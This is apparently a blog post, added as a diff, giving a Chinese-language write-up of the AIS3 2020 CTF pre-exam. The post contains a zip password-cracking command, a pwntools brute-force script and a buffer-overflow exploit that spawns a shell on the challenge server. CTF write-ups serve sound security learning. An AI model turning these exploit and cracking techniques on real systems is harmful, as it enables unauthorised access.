@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="AIS3 2020 pre-exam write-up今年第一次打AIS3 pre-exam，有很多第一次遇到的題目類型稍微整理了一下我有解的題目的解題過程，歡迎大家一起討論~ MiscPiquero 347 solves">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AIS3 2020 pre-exam write-up">
+<meta property="og:url" content="http://yoursite.com/2020/07/05/AIS3%202020%20pre-exam%20write-up/index.html">
+<meta property="og:site_name" content="Koios1143的筆記">
+<meta property="og:description" content="AIS3 2020 pre-exam write-up今年第一次打AIS3 pre-exam，有很多第一次遇到的題目類型稍微整理了一下我有解的題目的解題過程，歡迎大家一起討論~ MiscPiquero 347 solves">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://i.imgur.com/n7Qv1La.png">
+<meta property="og:image" content="https://i.imgur.com/sacvda7.png">
+<meta property="og:image" content="https://i.imgur.com/1542Noc.png">
+<meta property="og:image" content="https://i.imgur.com/0FHUY8U.png">
+<meta property="og:image" content="https://i.imgur.com/im8sEpk.png">
+<meta property="og:image" content="https://i.imgur.com/N3CWVCR.png">
+<meta property="og:image" content="https://i.imgur.com/Q2V5Pnc.png">
+<meta property="og:image" content="https://i.imgur.com/IXwhBr6.png">
+<meta property="og:image" content="https://i.imgur.com/g7Oy0E6.png">
+<meta property="article:published_time" content="2020-07-05T08:41:04.000Z">
+<meta property="article:modified_time" content="2020-07-05T09:48:19.254Z">
+<meta property="article:author" content="Koios1143">
+<meta property="article:tag" content="AIS3">
+<meta property="article:tag" content="CTF write-up">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/n7Qv1La.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/07/05/AIS3%202020%20pre-exam%20write-up/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-TW'
+  };
+</script>
+
+  <title>AIS3 2020 pre-exam write-up | Koios1143的筆記</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切換導航欄">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Koios1143的筆記</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/home" rel="section"><i class="home fa-fw"></i>首頁</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about" rel="section"><i class="about fa-fw"></i>關於</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags" rel="section"><i class="tags fa-fw"></i>標籤</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories" rel="section"><i class="th fa-fw"></i>分類</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-TW">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/05/AIS3%202020%20pre-exam%20write-up/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/rinko.jpg">
+      <meta itemprop="name" content="Koios1143">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Koios1143的筆記">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          AIS3 2020 pre-exam write-up
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">發表於</span>
+              
+
+              <time title="創建時間：2020-07-05 16:41:04 / 修改時間：17:48:19" itemprop="dateCreated datePublished" datetime="2020-07-05T16:41:04+08:00">2020-07-05</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分類於</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="AIS3-2020-pre-exam-write-up"><a href="#AIS3-2020-pre-exam-write-up" class="headerlink" title="AIS3 2020 pre-exam write-up"></a>AIS3 2020 pre-exam write-up</h1><p>今年第一次打AIS3 pre-exam，有很多第一次遇到的題目類型<br>稍微整理了一下我有解的題目的解題過程，歡迎大家一起討論~</p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Piquero"><a href="#Piquero" class="headerlink" title="Piquero"></a>Piquero</h2><blockquote>
+<p><strong>347 solves</strong></p>
+</blockquote>
+<h3 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h3><blockquote>
+<p>I can’t see the flag. Where is it?</p>
+</blockquote>
+<h3 id="File"><a href="#File" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/87e27cc8a1a515c5bdbaab2a3f898dc9/Piquero_99c9aa83fe492df8d52229017d4dca92297c9aeb.jpg?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjE5fQ.Xt9thg.Z0yZLQ2FfFp1K0KIdZh0m93w87Y" target="_blank" rel="noopener">Piquero</a></p>
+<h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>發現圖片內容是點字，於是到網路上找找點字的相關資料，會發現大概會是這樣:</p>
+<ul>
+<li>表示下個字母為大寫的tag<br>  <img src="https://i.imgur.com/n7Qv1La.png" alt=""></li>
+<li>表示下個字元為數字<br>  <img src="https://i.imgur.com/sacvda7.png" alt=""></li>
+<li>表示下個字原為符號<br>  <img src="https://i.imgur.com/1542Noc.png" alt=""><br>其餘的符號都是表示 <strong>字母</strong> / <strong>數字</strong><br>接下來對照網路上查到的table，就可以獲得flag</li>
+</ul>
+<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{I_feel_sleepy_Good_Night!!!}</code></p>
+<h2 id="Karuego"><a href="#Karuego" class="headerlink" title="Karuego"></a>Karuego</h2><blockquote>
+<p><strong>245 solves</strong></p>
+</blockquote>
+<h3 id="題目-1"><a href="#題目-1" class="headerlink" title="題目"></a>題目</h3><blockquote>
+<p>Students who fail to summon will be dropped out.</p>
+</blockquote>
+<h3 id="File-1"><a href="#File-1" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/6e929c470179fbd102d98db23b775425/Karuego_0d9f4a9262326e0150272debfd4418aaa600ffe4.png?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjIwfQ.Xt9vew.SmgmT3hDj2oGR8K0ZwnbtJjhUd8" target="_blank" rel="noopener">Karuego</a></p>
+<h3 id="解法-1"><a href="#解法-1" class="headerlink" title="解法"></a>解法</h3><p>對於png，先到binwalk裡檢查有沒有藏檔案，發現裡面有zip<br><img src="https://i.imgur.com/0FHUY8U.png" alt=""><br>發現到zip有經過加密，可透過fcrack搭配reckyou.txt爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -u -D -p rockyou.txt [zipname]</span><br></pre></td></tr></table></figure>
+<p>最後會找到<code>lafire</code></p>
+<h3 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{Ar3_y0u_r34l1y_r34dy_t0_summ0n_4_D3m0n?}</code></p>
+<h2 id="Soy"><a href="#Soy" class="headerlink" title="Soy"></a>Soy</h2><blockquote>
+<p><strong>172 solves</strong></p>
+</blockquote>
+<h3 id="題目-2"><a href="#題目-2" class="headerlink" title="題目"></a>題目</h3><blockquote>
+<p>Here is your flag. Oops, my bad.</p>
+</blockquote>
+<h3 id="File-2"><a href="#File-2" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/c5e1aa1353cedeea35505a6b57387297/Soy_b692c44dd2a32b30eee8a9315091d79f7dd8c8a8.png?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjIxfQ.Xt9yZw.uTwYRI5iSyL8wOWtM3St6OaLWag" target="_blank" rel="noopener">Soy</a></p>
+<h3 id="解法-2"><a href="#解法-2" class="headerlink" title="解法"></a>解法</h3><p><strong>賽後解</strong><br>可以利用<a href="https://merricx.github.io/qrazybox/" target="_blank" rel="noopener">QRazyBox</a>幫助解題<br>在上面畫完後使用Tools的Extract即可</p>
+<h3 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{H0w_c4n_y0u_f1nd_me?!?!?!!}</code></p>
+<h2 id="Saburo"><a href="#Saburo" class="headerlink" title="Saburo"></a>Saburo</h2><blockquote>
+<p><strong>108 solves</strong></p>
+</blockquote>
+<h3 id="題目-3"><a href="#題目-3" class="headerlink" title="題目"></a>題目</h3><blockquote>
+<p>Spell you flag and fight with me.</p>
+<p>PS. flag is printable characters with AIS3{…}</p>
+<p>nc 60.250.197.227 11001</p>
+</blockquote>
+<h3 id="解法-3"><a href="#解法-3" class="headerlink" title="解法"></a>解法</h3><p>nc上去後發現只會問問題，給個字串後會回覆一個數字<br>猜測Flag前綴為AIS3{<br>依序放入後發現數字會是嚴格遞增的，所以我們只需要寫個腳本把所有Ascii中visible的字元都Try過<br>中間會出現多次誤差，可以單個字元測試3~5次以減少誤差</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">final_answer = <span class="string">'AIS3&#123;'</span></span><br><span class="line">max_num = <span class="number">0</span></span><br><span class="line">max_chr = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">	max_chr = <span class="string">' '</span></span><br><span class="line">	time.sleep(<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">		now_num = <span class="number">0</span></span><br><span class="line">		<span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">			r = remote(<span class="string">'60.250.197.227'</span>, <span class="string">'11001'</span>)</span><br><span class="line">			r.recvuntil(<span class="string">' '</span>)</span><br><span class="line">			r.sendline(final_answer+chr(j))</span><br><span class="line">			tmp_num = int(r.recvuntil(<span class="string">'\n'</span>).split(<span class="string">b' '</span>)[<span class="number">4</span>])</span><br><span class="line">			<span class="keyword">if</span>(tmp_num &lt; max_num):</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			now_num += tmp_num</span><br><span class="line">		now_num = int(now_num/<span class="number">3</span>)</span><br><span class="line">		<span class="keyword">if</span>(now_num &gt; max_num):</span><br><span class="line">			max_num = now_num</span><br><span class="line">			max_chr = chr(j)</span><br><span class="line">			print(chr(j) + <span class="string">': '</span> + str(now_num))</span><br><span class="line">		r.close()</span><br><span class="line">	final_answer += max_chr</span><br><span class="line">	print(<span class="string">'max_num: '</span> + str(max_num))</span><br><span class="line">	print(<span class="string">'max_chr: '</span> + str(max_chr))</span><br><span class="line">	print(<span class="string">'final: '</span> + final_answer)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Flag-3"><a href="#Flag-3" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{A1r1ght_U_4r3_my_3n3nnies}</code></p>
+<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="TsaiBro"><a href="#TsaiBro" class="headerlink" title="TsaiBro"></a>TsaiBro</h2><blockquote>
+<p><strong>281 solves</strong></p>
+</blockquote>
+<h3 id="題目-4"><a href="#題目-4" class="headerlink" title="題目"></a>題目</h3><blockquote>
+<p>很好….你很腦殘嗎….敢這樣講刀劍神域…….我死也不會放過你 我..要..殺死…你..</p>
+</blockquote>
+<h3 id="File-3"><a href="#File-3" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/e5c6607ae2a2064a5d6557a07635c4d9/TsaiBroSaid?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjMzfQ.Xt913Q.EHy0Tl63eOr46omHxoueuAwokTw" target="_blank" rel="noopener">TsaiBroSaid</a><br><a href="https://pre-exam.ais3.org/files/7ad3e8255badfb74307edf17c49b0db4/TsaiBro?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjM0fQ.Xt913Q.57bxAT2F72tsh0UejnCiTKYoVfo" target="_blank" rel="noopener">TsaiBro</a></p>
+<h3 id="解法-4"><a href="#解法-4" class="headerlink" title="解法"></a>解法</h3><p>其實一開始根本毫無頭緒(?<br>在網路上找資料找到去年的write-up，發現考點相同<br>這題是考Tap Code，在一個<code>發財</code>左右兩側各可以拿到一組點<br>這裡的點可以去透過Table對照到一個字元<br>而Table可以在<code>strings TsaiBro</code>看到這串字</p>
+<p><img src="https://i.imgur.com/im8sEpk.png" alt=""></p>
+<p>裡面總共有64個點，參考剛剛<code>發財</code>附近的點數，最高是8個點，可以猜測會是8*8的Table<br>建表完直接對照就可以獲得Flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">table = [<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'&#123;'</span>,<span class="string">'&#125;'</span>,<span class="string">'_'</span>,</span><br><span class="line"><span class="string">'W'</span>,<span class="string">'X'</span>,<span class="string">'Y'</span>,<span class="string">'0'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,</span><br><span class="line"><span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,</span><br><span class="line"><span class="string">'S'</span>,<span class="string">'T'</span>,<span class="string">'U'</span>,<span class="string">'V'</span>,<span class="string">'G'</span>,<span class="string">'H'</span>,<span class="string">'I'</span>,<span class="string">'J'</span>,</span><br><span class="line"><span class="string">'K'</span>,<span class="string">'L'</span>,<span class="string">'M'</span>,<span class="string">'N'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,</span><br><span class="line"><span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,</span><br><span class="line"><span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'O'</span>,<span class="string">'P'</span>,<span class="string">'Q'</span>,<span class="string">'R'</span>,</span><br><span class="line"><span class="string">'C'</span>,<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'F'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>]</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"./flag.txt"</span>,<span class="string">"r"</span>).read().split(<span class="string">'\n'</span>)[<span class="number">1</span>]</span><br><span class="line">f = f.split(<span class="string">"發財"</span>)[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(f),<span class="number">2</span>):</span><br><span class="line">    print(table[(len(f[i])<span class="number">-1</span>)*<span class="number">8</span>+(len(f[i+<span class="number">1</span>])<span class="number">-1</span>)],end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Flag-4"><a href="#Flag-4" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3}</code></p>
+<h2 id="Fallen-Beat"><a href="#Fallen-Beat" class="headerlink" title="Fallen Beat"></a>Fallen Beat</h2><blockquote>
+<p><strong>171 solves</strong></p>
+</blockquote>
+<h3 id="題目-5"><a href="#題目-5" class="headerlink" title="題目"></a>題目</h3><blockquote>
+<p>CTF player,</p>
+<p>我要挑戰你, I’m gonna challenge you!!</p>
+<p>ZR</p>
+<p>這是我的室友兼 lab 同學,</p>
+<p>他已經考過金框暴龍天，他是個旋鈕人,</p>
+<p>不像你是個敲鍵盤的,</p>
+<p>所以我要測測你的程度到哪裡,</p>
+<p>就用 ZR 的大一 project 來決勝負吧！！</p>
+<p>得到 Full Combo 來讓我刮目相看！！</p>
+<p>author: terrynini</p>
+</blockquote>
+<h3 id="File-4"><a href="#File-4" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/06535c622222c7d33f2628fc899a69eb/Fallen_Beat.zip?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjI5fQ.Xt93jQ.Ep49McTc9vlDK0bAagjYGL4fYNk" target="_blank" rel="noopener">Fallen_Beats</a></p>
+<h3 id="解法-5"><a href="#解法-5" class="headerlink" title="解法"></a>解法</h3><p>可以發現到這是個幾乎不可能完成SS的音G<br>透過線上java decompiler decompile後可以知道，當達到MaxCombo時可以獲得Flag<br>雖然一開始Flag有給了一坨奇怪的東西，但是跟另一坨更怪的東西xor後，flag變得不可解<br>所以開始朝向玩Game發展<br>不過可以透過Cheat Engine幫你減速<br>但是譜很長，很容易失誤，所以說，CE還可以去改記憶體上的值<br>於是很開心的把值改成MaxCombo 1112<br>然後加速500倍直接結束遊戲</p>
+<p>…然而，這不是結束<br><img src="https://i.imgur.com/N3CWVCR.png" alt=""><br>你可以透過decompile的內容得知flag是直接存在變數中，所以直接用CE找到AIS3即可</p>
+<h3 id="AIS3"><a href="#AIS3" class="headerlink" title="AIS3"></a>AIS3</h3><p><code>AIS3{Wow_how_m4ny_h4nds_do_you_h4ve}</code></p>
+<h2 id="Stand-up-Brain"><a href="#Stand-up-Brain" class="headerlink" title="Stand up!Brain"></a>Stand up!Brain</h2><blockquote>
+<p><strong>62 solves</strong></p>
+</blockquote>
+<h3 id="題目-6"><a href="#題目-6" class="headerlink" title="題目"></a>題目</h3><blockquote>
+<p>又到了 Brain tell 咪 ㄜ joke 的時間了</p>
+<p>這次輪到你說個笑話來聽聽了</p>
+</blockquote>
+<h3 id="File-5"><a href="#File-5" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/5ba33eef5695107f022ab8e3151aaba5/joke?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjI4fQ.Xt95kw.-MkSvwqZ7Pe-SIpQehQOO5xg_b8" target="_blank" rel="noopener">joke</a></p>
+<h3 id="解法-6"><a href="#解法-6" class="headerlink" title="解法"></a>解法</h3><p><strong>賽後解</strong><br>strings後會發現到裡面存有brain fuck<br>發現到執行後會失敗，因此會去重看字串<br>但是前面有一串連續的重複字串<br>刪除後就可以執行了<br>最後會剩下這些內容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;----[----&gt;+&lt;]&gt;++.++++++++.++++++++++.&gt;-[-----&gt;+&lt;]&gt;.+[---&gt;++&lt;]&gt;+++.&gt;-[---&gt;+&lt;]&gt;-.[----&gt;+++++&lt;]&gt;-.[--&gt;+&lt;]&gt;---.[---&gt;++&lt;]&gt;---.++[-&gt;+++&lt;]&gt;.+[--&gt;+&lt;]&gt;+.[---&gt;++&lt;]&gt;---.++[-&gt;+++&lt;]&gt;.+++.[---&gt;+&lt;]&gt;----.[--&gt;+&lt;]&gt;-----.[-&gt;++&lt;]&gt;+.-[----&gt;+++&lt;]&gt;.--------.&gt;-[---&gt;+&lt;]&gt;.-[-----&gt;+&lt;]&gt;-.++++++++.--[-----&gt;+++&lt;]&gt;.+++.[---&gt;+&lt;]&gt;-.-[--&gt;+&lt;]&gt;---.++[---&gt;+++++&lt;]&gt;.++++++++++++++.+++[-&gt;+++++&lt;]&gt;.[-----&gt;+&lt;]&gt;++.&gt;-[-----&gt;+&lt;]&gt;.---[-&gt;++&lt;]&gt;-.++++++.[---&gt;+&lt;]&gt;+++.+++.[-]</span><br></pre></td></tr></table></figure>
+
+<h3 id="Flag-5"><a href="#Flag-5" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{Th1s_1s_br4iNFUCK_bu7_m0r3_ez}</code></p>
+<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="BOF"><a href="#BOF" class="headerlink" title="BOF"></a>BOF</h2><blockquote>
+<p><strong>189 solves</strong></p>
+</blockquote>
+<h3 id="題目-7"><a href="#題目-7" class="headerlink" title="題目"></a>題目</h3><blockquote>
+<p>That is easy-peasy challenge and even my grandma can do.</p>
+<p>nc 60.250.197.227 10000</p>
+<p>Challenge environment: Ubuntu 18.04</p>
+</blockquote>
+<h3 id="File-6"><a href="#File-6" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/11d14c680ee0519800bf4b7390da49b5/bof-767fdf896cf9838c0294db24eaa1271ebf15a6e638a873e94ab9682ef28464b4?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjh9.Xt960g.YHP8JWgYM3hlRmcPqBEIUUKXmuU" target="_blank" rel="noopener">BOF</a></p>
+<h3 id="解法-7"><a href="#解法-7" class="headerlink" title="解法"></a>解法</h3><p>透過IDA-Pro decompile後可以發現<code>system(&quot;sh&quot;)</code><br>查看記憶體位置後再測試一下中間需要塞入多少bytes<br>可以發現本機塞入52個字元後會開始引響<code>rip</code><br>但是在Ubuntu上似乎需要-4(這部分是猜到的)<br>最後寫個腳本即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'60.250.197.227'</span>, <span class="string">'10000'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">target = p64(<span class="number">0x400687</span>)</span><br><span class="line">r.sendline(<span class="string">b'A'</span>*<span class="number">48</span> + target)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Flag-6"><a href="#Flag-6" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{OLd_5ChOOl_tr1ck_T0_m4Ke_s7aCk_A116nmeNt}</code></p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Brontosaurus"><a href="#Brontosaurus" class="headerlink" title="Brontosaurus"></a>Brontosaurus</h2><blockquote>
+<p><strong>380 solves</strong></p>
+</blockquote>
+<h3 id="題目-8"><a href="#題目-8" class="headerlink" title="題目"></a>題目</h3><blockquote>
+<p>Brontosaurus peek at last year’s problems with a long neck and picked up “KcufsJ”.</p>
+</blockquote>
+<h3 id="File-7"><a href="#File-7" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/485ad6e60bae0bcff72147bc9a39fdb1/KcufsJ?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjJ9.Xt99Kg.fDdDMx4trtkxy8cmQmrPCwvdkNg" target="_blank" rel="noopener">KcufsJ</a></p>
+<h3 id="解法-8"><a href="#解法-8" class="headerlink" title="解法"></a>解法</h3><p>開啟檔案後會發現是JSFuck<br>但是直接拿去執行會出錯<br>需要先reverse字串後再執行即可</p>
+<h3 id="Flag-7"><a href="#Flag-7" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{Br0n7Os4uru5_ch3at_3asi1Y}</code></p>
+<h2 id="T-Rex"><a href="#T-Rex" class="headerlink" title="T-Rex"></a>T-Rex</h2><blockquote>
+<p><strong>381 solves</strong></p>
+</blockquote>
+<h3 id="題目-9"><a href="#題目-9" class="headerlink" title="題目"></a>題目</h3><blockquote>
+<p>Tyrannosaurus-rex is an nihilist.</p>
+</blockquote>
+<h3 id="File-8"><a href="#File-8" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/46ce9cf3bdd86cf183820863cf7d45c6/prob?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjI3fQ.Xt9-mw.eiY4Nsp3Odo637z3ZL6xn9U_ZrY" target="_blank" rel="noopener">Prob</a></p>
+<h3 id="解法-9"><a href="#解法-9" class="headerlink" title="解法"></a>解法</h3><p>很明顯的，只要對照Table即可<br>(當然，還是寫code不傷眼)</p>
